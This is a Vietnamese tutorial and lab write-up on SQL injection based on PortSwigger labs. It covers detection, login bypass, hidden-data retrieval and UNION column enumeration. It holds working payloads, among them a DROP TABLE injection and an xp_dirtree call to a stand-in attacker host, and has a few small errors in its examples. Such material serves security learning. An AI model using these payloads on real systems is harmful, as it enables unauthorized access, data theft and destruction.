# LỖ HỔNG SQL INJECTION (PORTSWIGGER)

---

## 1. SQL injection là gì?

- SQL Injection (SQLi) là một lỗ hổng bảo mật cho phép kẻ tấn công chèn (inject) mã SQL độc hại vào câu truy vấn của ứng dụng để:

  - Truy xuất dữ liệu không được phép

  - Thay đổi, chèn, hoặc xóa dữ liệu

  - Thực hiện các hành vi khác như lấy tài khoản admin, RCE (trong một số trường hợp nâng cao.

- Về bản chất của lỗ hổng SQLi: Khi ứng dụng web nhận input từ người dùng và nhúng trực tiếp vào câu truy vấn SQL mà không kiểm tra hoặc lọc kỹ, hacker có thể thêm đoạn mã SQL độc hại để thao túng truy vấn.

- Ví dụ giả sử đoạn code phía backend xử lý login như sau (PHP + MySQL):

```php
$username = $_POST['username'];
$password = $_POST['password'];

$sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

- Nếu người dùng nhập:

```bash
username: admin
password: ' OR '1'='1
```

- Câu truy vấn sẽ trở thành:

```sql
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'
```

&rarr;  OR '1'='1' luôn đúng → Hacker đăng nhập được không cần mật khẩu.

---

## 2. Cách phát hiện lỗ hổng SQL injection

- **Dùng ký tự dấu nháy đơn ' để tìm lỗi**: Đây là một ký tự đặc biệt trong SQL, dùng để bao quanh giá trị dạng chuỗi. Nếu ứng dụng không xử lý đúng input này, nó sẽ làm câu lệnh SQL bị lỗi cú pháp, dẫn đến báo lỗi từ cơ sở dữ liệu.
  
  Giả sử ta có đoạn query bên trong web:

  ```sql
  SELECT * FROM users WHERE username = '$input';
  ```

  Khi người dùng nhập: admin &rarr; câu query trở thành:

  ```sql
  SELECT * FROM users WHERE username = 'admin'';
  ```

  &rarr; Nếu web trả lại lỗi từ SQL (như "syntax error" hoặc "unclosed quotation mark"), có thể tồn tại SQL injection.

- **Dùng điều kiện Boolean (OR 1=1, OR 1=2) để phân biệt**: Dùng những biểu thức đúng/sai trong SQL để kiểm tra phản hồi có thay đổi hay không.

  Giả sử form login có SQL:

  ```sql
  SELECT * FROM users WHERE username = '$user' AND password = '$pass';
  ```

  Khi nhập: user = admin' OR 1=1 -- → câu lệnh trở thành:

  ```sql
  SELECT * FROM users WHERE username = 'admin' OR 1=1 -- ' AND password = 'abc';
  ```

  Do 1=1 luôn đúng, câu lệnh trả về tất cả người dùng → có thể login mà không cần mật khẩu.

- **Dùng payload gây delay (Time-based Blind SQLi)**: Khi ứng dụng không hiển thị lỗi hay khác biệt về nội dung, ta thử gây chậm phản hồi bằng SQL. Nếu server chậm phản hồi đúng như thời gian delay → có thể bị SQLi.

  Ví dụ với MySQL:

  ```sql
  admin' AND SLEEP(5) --
  ```

  Nếu server mất khoảng 5 giây mới trả lời → xác nhận SQL injection tồn tại.

- **OAST payloads (Out-Of-Band Application Security Testing)**: Payload SQL được thiết kế để kích hoạt truy cập mạng đến một máy chủ. Nếu thấy có yêu cầu đến server bạn kiểm soát, thì lỗ hổng tồn tại.

  Ví dụ: với SQL Server, dùng:

  ```sql
  '; exec xp_dirtree('\\attacker.com\test') --
  ```

  → Nếu server gửi truy vấn DNS đến attacker.com, ta biết SQLi đã thực thi.

- Ngoài ra, SQLi có thể tồn tại trong bất ký vị trí nào trong câu truy vấn, và trong nhiều kiểu truy vấn khác nhau: WHERE, UPDATE, INSERT, ORDER BY, ...

  Ví dụ:

  ```sql
  INSERT INTO feedback (comment) VALUES ('$input');
  ```

  Nếu *$input = abcxyz'); DROP TABLE users; --,* thì truy vấn thành:

  ```sql
  INSERT INTO feedback (comment) VALUES ('abcxyz'); DROP TABLE users; --');
  ```

  &rarr; Đây là một chuỗi truy vấn nhiều câu lệnh (multi-statement) → Bảng users bị xóa.

---

## 3. Trích xuất dữ liệu ẩn

- Giả sử trên một trang web, user chọn một danh mục ABC và trình duyeejh sẽ gửi yêu cầu như:

  ```url
  https://website.com/products?category=ABC
  ```

  Lúc đó, ứng dụng web sẽ sử dụng giá trị "ABC" để tạo ra một truy vấn SQL như sau:

  ```sql
  SELECT * FROM products WHERE category = 'Gifts' AND released = 1;
  ```

  với *AND released = 1* chỉ hiển thị các sản phẩm đã được "phát hành" (có thể bán). Do đó khi attacker muốn xem cả các sản phẩm chưa phát hành, tức là released = 0. Ta có thể chèn        thêm vào URL để điều chỉnh câu lệnh SQL như:

  ```url
  https://website.com/products?category=ABC' OR 1=1 -- 
  ```

  Tạo ra câu truy vấn:

  ```sql
  SELECT * FROM products WHERE category = 'ABC' OR 1=1-- ' AND released = 1;
  ```

  &rarr; OR 1=1 luôn đúng, -- ký hiệu comment → tất cả phần sau -- đều bị bỏ qua và câu *AND released = 1* không còn hiệu lực.

  ⇒ Truy vấn trả về tất cả sản phẩm trong bảng products kể cả không phát hành.

  ⇒ Dữ liệu bị ẩn đã bị lộ.

  ### Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

- Với cách thức như vậy, ta thử khai thác với website có các option danh mục như sau:

  <img width="1919" height="872" alt="image" src="https://github.com/user-attachments/assets/90ebd16a-34ee-432d-bc8e-23d4ee4caa90" />

  Ta chọn danh mục Accesstories, lúc này burp suite bắt được request của trình duyệt:

  <img width="1405" height="697" alt="image" src="https://github.com/user-attachments/assets/dea47a0d-7ca1-4f5e-acc7-40db8d082d34" />

  Sử dụng Repeater để gửi lại request đó như sau:

  ```bash
  GET /filter?category=Accessories' OR 1=1 --
  ```

  Lúc này câu truy vấn được xử lý sẽ trở thành:

  ```sql
  SELECT * FROM products WHERE category = 'Accessories' OR 1=1 --' AND released = 1;
  ```  

  Kết quả thành công, ta sẽ thấy website trả về tất cả các sản phẩm:

  <img width="1839" height="744" alt="image" src="https://github.com/user-attachments/assets/79709f76-6cd3-4d85-8548-3105d3419a31" />

---

## 4. Sai logic xử lý của ứng dụng

- SQLi cũng có thể tổn tại trong form đăng nhập của website. Giả sử user điền "ngoctai" và "password", lúc này ứng dụng sẽ tạo ra câu truy vấn:

  ```sql
  SELECT * FROM users WHERE username = 'ngoctai' AND password = 'password'
  ```

  Tuy nhiên, nếu hacker nhập: *username = admin' --* và password là bất kỳ.

  Lúc này câu SQL sinh ra là:

  ```sql
  SELECT * FROM users WHERE username = 'admin' --' AND password = ''
  ```

  &rarr; Kết quả --' sẽ làm mọi câu sau nó bị bỏ qua, phần *AND password = ''* bị vô hiệu hóa &rarr; Đăng nhập thành công dù không biết mật khẩu.

  ### Lab: SQL injection vulnerability allowing login bypass

- Với cách thức như vậy, ta thử khai thác một form login như sau:

  <img width="1916" height="872" alt="image" src="https://github.com/user-attachments/assets/0ba5fba3-2c1d-4cda-9906-86004568ea5f" />

  Kiểm tra request gửi thông tin username và password trên burp suite:

  <img width="1415" height="760" alt="image" src="https://github.com/user-attachments/assets/fed945bf-86ac-499e-8cff-affc4036e742" />

  Nhập nội dung username như bên dưới:

  <img width="1919" height="874" alt="image" src="https://github.com/user-attachments/assets/408d139d-8cd8-45f1-821f-ed12f58928c0" />

  Lúc này, câu SQL trở thành:

  ```sql
  SELECT * FROM users WHERE username = 'admin' --' AND password = '123'
  ```

  Kết quả bypass thành công:

  <img width="1919" height="875" alt="image" src="https://github.com/user-attachments/assets/e55f43a0-c435-44b6-aff2-e842ac1d27d2" />

---

## 5. SQL injection UNION attacks

- Câu lệnh UNION trong SQL dùng để kết hợp kết quả của 2 hoặc nhiều câu lệnh SELECT thành một tập kết quả duy nhất. Giống như phép hợp trong toán học.

  Cú pháp lệnh UNION như sau:

  ```bash
  SELECT column1, column2 FROM table1
  UNION
  SELECT column1, column2 FROM table2;
  ```

  Để thực hiện được lợi dụng lệnh UNION, ta cần phải biết hoặc đoán đúng số cột và kiểu dữ liệu trong câu truy vấn gốc. Bởi vì giả sử nếu câu truy vấn gốc select hai cột hợp (union) với   câu truy vấn 1 hoặc 3 cột thì kết quả trả về sẽ lỗi vì không đồng nhất kết quả dữ liệu, do đó mà không thể hiển thị ra giao diện.

  Ví dụ với một URL như sau:

  ```url
  http://website.com/products.php?id=5
  ```

  Phía server thực hiện truy vấn:

  ```sql
  SELECT name, price FROM products WHERE id = 5;
  ```

  Trong trường hợp nếu ta có thể chèn thêm câu lệnh UNION vào URL như sau:

  ```url
  http://website.com/products.php?id=5 UNION SELECT username, password FROM users
  ```

  Câu truy vấn sẽ trở thành:

  ```sql
  SELECT name, price FROM products WHERE id = 5
  UNION
  SELECT username, password FROM users;
  ```

  &rarr; Kết quả ta sẽ thấy cột username và password từ bảng users hiển thị ra trang web.

---

## 5. Xác định số lượng cột

- Như đã nói ở mục trước, khi muốn sử dụng UNION SELECT để trích xuất dữ liệu từ bảng khác, thì số lượng cột trong truy vấn gốc và truy vấn bạn chèn vào phải bằng nhau.

- Một phương pháp để xác định là sử dụng mệnh đề *ORDER BY*, lệnh này được sử dụng để sắp xếp kết quả truy vấn (query results) theo một hoặc nhiều cột.

- Với *ORDER BY <index>* sẽ thực hiện sắp xếp kết quả theo vị trí cột được chỉ định trong câu lệnh SELECT.

- Ví dụ:

  ```sql
  SELECT name, age, gpa
  FROM students
  ORDER BY 2;  -- tức là sắp xếp theo cột thứ 2 là 'age'
  ```

  &rarr; Nếu ta chỉ định một số lớn hơn số lượng cột thực tế, SQL sẽ báo lỗi. Do đó có thể lợi dụng điều này để khai thác xác định số lượng cột.

- Giả sử ta thực hiện lần lượt tạo các tham số id trong URL như sau:

  ```url
  http://example.com/product?id=1' ORDER BY 1-- 
  http://example.com/product?id=1' ORDER BY 2-- 
  http://example.com/product?id=1' ORDER BY 3-- 
  ...
  ```

  Mỗi payload sẽ được tạo một câu truy vấn như sau:

  ```sql
  SELECT name, description FROM products WHERE id='1' ORDER BY 1-- 
  ```

  Do đó khi ta tăng dần số lượng:

  ```bash
  ' ORDER BY 1-- → OK 

  ' ORDER BY 2-- → OK 

  ' ORDER BY 3-- → Lỗi (vì bảng chỉ có 2 cột)
  ```

  &rarr; Kết luận câu truy vấn gốc thực hiện truy vấn hai cột.

- Một phương pháp khác là sử dụng *UNION SELECT NULL*, bản chất là gửi các payload UNION SELECT với số lượng NULL khác nhau cho đến khi bạn không gặp lỗi, nghĩa là bạn đã khớp được số lượng cột của truy vấn gốc. Bởi vì NULL là không có kiểu dữ liệu cụ thể, nên nó tương thích với mọi loại cột.

- Nên ta có thể tạo các tham số id như sau:

  ```bash
  ?id=1' UNION SELECT NULL-- -
  ?id=1' UNION SELECT NULL,NULL-- -
  ?id=1' UNION SELECT NULL,NULL,NULL-- -
  ...
  ```

  Nếu số lượng NULL không khớp số lượng cột ở câu truy vấn gốc, database có thể bảo lỗi hoặc ứng dụng sẽ trả lỗi HTTP.
  





  

  

  

  

